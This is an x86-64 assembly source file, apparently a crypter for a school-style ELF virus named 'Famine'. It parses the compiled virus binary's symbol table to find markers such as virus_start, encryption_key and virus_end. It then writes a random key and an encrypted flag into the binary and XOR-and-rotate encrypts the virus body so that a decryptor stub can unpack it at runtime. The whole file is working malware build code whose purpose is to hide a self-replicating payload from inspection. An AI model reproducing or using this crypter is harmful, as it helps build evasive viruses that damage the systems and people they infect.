; Simple encryption program for Famine
%define SYS_READ        0
%define SYS_WRITE       1
%define SYS_OPEN        2
%define SYS_CLOSE       3
%define SYS_LSEEK       8
%define SYS_EXIT        60
%define SYS_GETRANDOM   318

%define O_RDWR          2
%define SEEK_SET        0
%define SEEK_END        2

%define KEY_SIZE        16

; ELF64 structure offsets
%define ELF_SHOFF       40      ; Section header table offset
%define ELF_SHENTSIZE   58      ; Section header entry size
%define ELF_SHNUM       60      ; Number of section headers
%define ELF_SHSTRNDX    62      ; Section header string table index

; Section header offsets
%define SH_NAME         0       ; Section name (string tbl index)
%define SH_TYPE         4       ; Section type
%define SH_OFFSET       24      ; Section file offset
%define SH_SIZE         32      ; Section size
%define SH_LINK         40      ; Link to another section
%define SH_ENTSIZE      56      ; Entry size if section holds table

; Symbol table entry offsets (ELF64)
%define ST_NAME         0       ; Symbol name (string tbl index)
%define ST_INFO         4       ; Symbol type and binding
%define ST_VALUE        8       ; Symbol value
%define ST_SIZE         16      ; Symbol size

section .data
    msg_success:    db "Encrypted successfully", 10, 0
    msg_error:      db "Error", 10, 0
    msg_usage:      db "Usage: ./encrypt <filename>", 10, 0
    
    ; Symbol names to search for
    sym_virus_start:        db "virus_start", 0
    sym_encryption_key:     db "encryption_key", 0
    sym_encrypted_flag:     db "encrypted_flag", 0
    sym_encrypted_offset:   db "encrypted_offset", 0
    sym_encrypted_size:     db "encrypted_size", 0
    sym_decrypt_code_end:   db "decrypt_code.end", 0
    sym_virus_end:          db "virus_end", 0

section .bss
    key_buffer:             resb KEY_SIZE
    file_buffer:            resb 65536
    file_size:              resq 1
    filename_ptr:           resq 1
    
    ; Symbol addresses (will be populated dynamically)
    addr_virus_start:       resq 1
    addr_encryption_key:    resq 1
    addr_encrypted_flag:    resq 1
    addr_encrypted_offset:  resq 1
    addr_encrypted_size:    resq 1
    addr_decrypt_code_end:  resq 1
    addr_virus_end:         resq 1
    
    ; ELF parsing buffers
    elf_header:             resb 64
    section_headers:        resb 4096
    symbol_table:           resb 8192
    string_table:           resb 8192

section .text
global _start

print_str:
    push rbp
    mov rbp, rsp
    mov rsi, rdi
    xor rdx, rdx
.loop:
    cmp byte [rsi + rdx], 0
    je .done
    inc rdx
    jmp .loop
.done:
    mov eax, 1
    mov edi, 1
    syscall
    pop rbp
    ret

generate_key:
    mov eax, 318
    lea rdi, [rel key_buffer]
    mov esi, KEY_SIZE
    xor edx, edx
    syscall
    ; Convert to alphanumeric
    xor rcx, rcx
.loop:
    cmp rcx, KEY_SIZE
    jge .done
    lea rsi, [rel key_buffer]
    movzx eax, byte [rsi + rcx]
    xor rdx, rdx
    mov ebx, 62
    div ebx
    cmp edx, 10
    jl .digit
    cmp edx, 36
    jl .upper
    sub edx, 36
    add edx, 'a'
    jmp .store
.upper:
    sub edx, 10
    add edx, 'A'
    jmp .store
.digit:
    add edx, '0'
.store:
    mov byte [rsi + rcx], dl
    inc rcx
    jmp .loop
.done:
    ret

encrypt_buffer:
    ; rdi = buffer, rsi = size
    push rbp
    mov rbp, rsp
    xor rbx, rbx
    xor r8, r8
.loop:
    cmp rbx, rsi
    jge .done
    mov al, [rdi + rbx]
    mov rax, r8
    xor rdx, rdx
    mov rcx, KEY_SIZE
    div rcx
    lea r10, [rel key_buffer]
    mov r9b, [r10 + rdx]
    mov al, [rdi + rbx]
    xor al, r9b
    rol al, 3
    mov [rdi + rbx], al
    inc rbx
    inc r8
    jmp .loop
.done:
    pop rbp
    ret

; Compare two null-terminated strings
; rdi = string 1, rsi = string 2
; Returns: rax = 1 if equal, 0 if not equal
strcmp:
    push rbp
    mov rbp, rsp
    xor rax, rax
.loop:
    mov al, byte [rdi]
    mov dl, byte [rsi]
    cmp al, dl
    jne .not_equal
    test al, al
    jz .equal
    inc rdi
    inc rsi
    jmp .loop
.equal:
    mov rax, 1
    jmp .done
.not_equal:
    xor rax, rax
.done:
    pop rbp
    ret

; Find symbol address in the file
; rdi = symbol name, r12 = file descriptor
; Returns: rax = file offset of symbol, or 0 if not found
find_symbol:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    push rbx
    push r13
    push r14
    push r15
    
    mov [rbp-8], rdi        ; Save symbol name
    
    ; Read ELF header
    mov eax, SYS_LSEEK
    mov edi, r12d
    xor esi, esi
    xor edx, edx
    syscall
    
    mov eax, SYS_READ
    mov edi, r12d
    lea rsi, [rel elf_header]
    mov edx, 64
    syscall
    
    ; Get section header info
    lea rdi, [rel elf_header]
    mov rax, [rdi + ELF_SHOFF]
    mov [rbp-16], rax       ; Section header offset
    movzx r13, word [rdi + ELF_SHNUM]   ; Number of sections
    movzx r14, word [rdi + ELF_SHSTRNDX] ; String table section index
    
    ; Read section headers
    mov eax, SYS_LSEEK
    mov edi, r12d
    mov rsi, [rbp-16]
    xor edx, edx
    syscall
    
    mov eax, SYS_READ
    mov edi, r12d
    lea rsi, [rel section_headers]
    mov edx, 4096
    syscall
    
    ; Find .symtab and .strtab sections
    xor rbx, rbx            ; Section index
    xor r15, r15            ; .symtab offset
    mov qword [rbp-24], 0   ; .strtab offset
    
.find_sections:
    cmp rbx, r13
    jge .sections_done
    
    ; Calculate section header address
    mov rax, rbx
    imul rax, 64            ; sizeof(Elf64_Shdr) = 64
    lea rdi, [rel section_headers]
    add rdi, rax
    
    ; Check section type
    mov eax, [rdi + SH_TYPE]
    cmp eax, 2              ; SHT_SYMTAB
    je .found_symtab
    cmp eax, 3              ; SHT_STRTAB
    jne .next_section
    
    ; Check if this is not the section header string table
    cmp rbx, r14
    je .next_section
    
    ; Found .strtab
    mov rax, [rdi + SH_OFFSET]
    mov [rbp-24], rax
    jmp .next_section
    
.found_symtab:
    mov r15, [rdi + SH_OFFSET]  ; Symbol table offset
    mov [rbp-32], rdi            ; Save symtab section header pointer
    
.next_section:
    inc rbx
    jmp .find_sections
    
.sections_done:
    ; Check if we found both tables
    test r15, r15
    jz .not_found
    cmp qword [rbp-24], 0
    je .not_found
    
    ; Read symbol table
    mov eax, SYS_LSEEK
    mov edi, r12d
    mov rsi, r15
    xor edx, edx
    syscall
    
    mov eax, SYS_READ
    mov edi, r12d
    lea rsi, [rel symbol_table]
    mov edx, 8192
    syscall
    
    ; Read string table
    mov eax, SYS_LSEEK
    mov edi, r12d
    mov rsi, [rbp-24]
    xor edx, edx
    syscall
    
    mov eax, SYS_READ
    mov edi, r12d
    lea rsi, [rel string_table]
    mov edx, 8192
    syscall
    
    ; Get symtab size and calculate number of symbols
    mov rdi, [rbp-32]
    mov rax, [rdi + SH_SIZE]
    xor rdx, rdx
    mov rcx, 24             ; sizeof(Elf64_Sym)
    div rcx
    mov r13, rax            ; Number of symbols
    
    ; Search through symbols
    xor rbx, rbx
.search_symbols:
    cmp rbx, r13
    jge .not_found
    
    ; Calculate symbol entry address
    mov rax, rbx
    imul rax, 24            ; sizeof(Elf64_Sym)
    lea rdi, [rel symbol_table]
    add rdi, rax
    
    ; Get symbol name index
    mov eax, [rdi + ST_NAME]
    test eax, eax
    jz .next_symbol
    
    ; Get symbol name from string table
    lea rsi, [rel string_table]
    add rsi, rax
    
    ; Compare with target name
    push rdi
    mov rdi, rsi
    mov rsi, [rbp-8]
    call strcmp
    pop rdi
    
    test rax, rax
    jz .next_symbol
    
    ; Found! Get symbol value and convert to file offset
    mov rax, [rdi + ST_VALUE]
    ; Assuming .text starts at 0x401000, file offset is vaddr - 0x401000 + 0x1000
    sub rax, 0x401000
    add rax, 0x1000
    jmp .done
    
.next_symbol:
    inc rbx
    jmp .search_symbols
    
.not_found:
    xor rax, rax
    
.done:
    pop r15
    pop r14
    pop r13
    pop rbx
    add rsp, 32
    pop rbp
    ret

_start:
    ; Check for command-line argument
    ; Stack: [rsp] = argc, [rsp+8] = argv[0], [rsp+16] = argv[1]
    pop rax             ; argc
    cmp rax, 2
    jne usage_error
    
    pop rax             ; argv[0] - discard
    pop rax             ; argv[1] - filename
    mov [rel filename_ptr], rax
    
    ; Open file
    mov eax, 2
    mov rdi, [rel filename_ptr]
    mov esi, O_RDWR
    syscall
    test rax, rax
    js error
    mov r12, rax
    
    ; Find all required symbols
    lea rdi, [rel sym_virus_start]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_virus_start], rax
    
    lea rdi, [rel sym_encryption_key]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_encryption_key], rax
    
    lea rdi, [rel sym_encrypted_flag]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_encrypted_flag], rax
    
    lea rdi, [rel sym_encrypted_offset]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_encrypted_offset], rax
    
    lea rdi, [rel sym_encrypted_size]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_encrypted_size], rax
    
    lea rdi, [rel sym_decrypt_code_end]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_decrypt_code_end], rax
    
    lea rdi, [rel sym_virus_end]
    call find_symbol
    test rax, rax
    jz error
    mov [rel addr_virus_end], rax
    
    ; Get size
    mov eax, 8
    mov edi, r12d
    xor esi, esi
    mov edx, 2
    syscall
    mov [rel file_size], rax
    
    ; Read file
    mov eax, 8
    mov edi, r12d
    xor esi, esi
    xor edx, edx
    syscall
    mov eax, 0
    mov edi, r12d
    lea rsi, [rel file_buffer]
    mov rdx, [rel file_size]
    syscall
    
    ; Generate key
    call generate_key
    
    ; Write key to encryption_key location in buffer (dynamically found)
    lea rdi, [rel file_buffer]
    add rdi, [rel addr_encryption_key]
    lea rsi, [rel key_buffer]
    mov rcx, KEY_SIZE
.write_key:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    test rcx, rcx
    jnz .write_key
    
    ; Set encrypted flag (dynamically found)
    lea rdi, [rel file_buffer]
    add rdi, [rel addr_encrypted_flag]
    mov byte [rdi], 1
    
    ; Write encrypted_offset (offset from virus_start to decrypt_code.end)
    lea rdi, [rel file_buffer]
    add rdi, [rel addr_encrypted_offset]
    mov rax, [rel addr_decrypt_code_end]
    sub rax, [rel addr_virus_start]
    mov [rdi], rax
    
    ; Write encrypted_size (size from decrypt_code.end to virus_end)
    lea rdi, [rel file_buffer]
    add rdi, [rel addr_encrypted_size]
    mov rax, [rel addr_virus_end]
    sub rax, [rel addr_decrypt_code_end]
    mov [rdi], rax
    
    ; Encrypt from decrypt_code.end for calculated size
    lea rdi, [rel file_buffer]
    add rdi, [rel addr_decrypt_code_end]
    mov rax, [rel addr_virus_end]
    sub rax, [rel addr_decrypt_code_end]
    mov rsi, rax
    call encrypt_buffer
    
    ; Write back
    mov eax, 8
    mov edi, r12d
    xor esi, esi
    xor edx, edx
    syscall
    mov eax, 1
    mov edi, r12d
    lea rsi, [rel file_buffer]
    mov rdx, [rel file_size]
    syscall
    
    ; Close
    mov eax, 3
    mov edi, r12d
    syscall
    
    lea rdi, [rel msg_success]
    call print_str
    
    mov eax, 60
    xor edi, edi
    syscall

usage_error:
    lea rdi, [rel msg_usage]
    call print_str
    mov eax, 60
    mov edi, 1
    syscall

error:
    lea rdi, [rel msg_error]
    call print_str
    mov eax, 60
    mov edi, 1
    syscall
